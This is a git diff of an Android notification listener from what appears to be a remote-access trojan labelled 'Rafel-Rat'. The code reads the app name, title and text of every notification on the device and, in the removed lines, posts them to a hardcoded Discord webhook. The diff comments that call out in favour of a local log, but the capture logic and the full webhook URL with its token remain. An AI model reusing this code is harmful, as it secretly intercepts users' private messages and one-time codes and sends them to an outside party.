@@ -29,40 +29,43 @@ public class NotificationListener extends NotificationListenerService {
 
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
     @Override
-    public void onNotificationPosted(StatusBarNotification sbn){
+    public void onNotificationPosted(StatusBarNotification sbn) {
         try {
             String appName = sbn.getPackageName();
             String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
             CharSequence contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
             String content = "";
-            if(contentCs != null) content = contentCs.toString();
+            if (contentCs != null) content = contentCs.toString();
             String Content = content;
-            new Thread(){
+            new Thread() {
                 @Override
                 public void run() {
                     try {
-                        if(!appName.equals("com.velociraptor.raptor")){
-                            senddisp("App Name : " + appName + " " +  "Title : " + title + " " + "Content : " + Content);
+                        if (!appName.equals("com.velociraptor.raptor")) {
+                            senddisp("App Name : " + appName + " " + "Title : " + title + " " + "Content : " + Content);
                             Intent serviceIntent = new Intent(NotificationListener.this, ForegroundService.class);
                             serviceIntent.putExtra("inputExtra", "Warning !! Dont Close the App");
                             ContextCompat.startForegroundService(NotificationListener.this, serviceIntent);
-                            }
+                        }
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
                 }
             }.start();
-            
+
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
+    private static final String TAG = "H_NotificationListener";
+
     public static void senddisp(String msg) throws IOException {
-        DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/921133285835423815/q9AEBnc-O2EYsrpOSpXfYzp1nF0xMKfu_CnwDLPjBiB_pDvOoZP-dfG2vhFCW27Xqti9");
-        webhook.setContent(msg);
-        webhook.setAvatarUrl("https://avatars.githubusercontent.com/u/46685308?v=4");
-        webhook.setUsername("Rafel-Rat-");
-        webhook.execute();
+        Log.d(TAG, "senddisp: " + msg);
+        // DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/921133285835423815/q9AEBnc-O2EYsrpOSpXfYzp1nF0xMKfu_CnwDLPjBiB_pDvOoZP-dfG2vhFCW27Xqti9");
+        // webhook.setContent(msg);
+        // webhook.setAvatarUrl("https://avatars.githubusercontent.com/u/46685308?v=4");
+        // webhook.setUsername("Rafel-Rat-");
+        // webhook.execute();
     }
 }
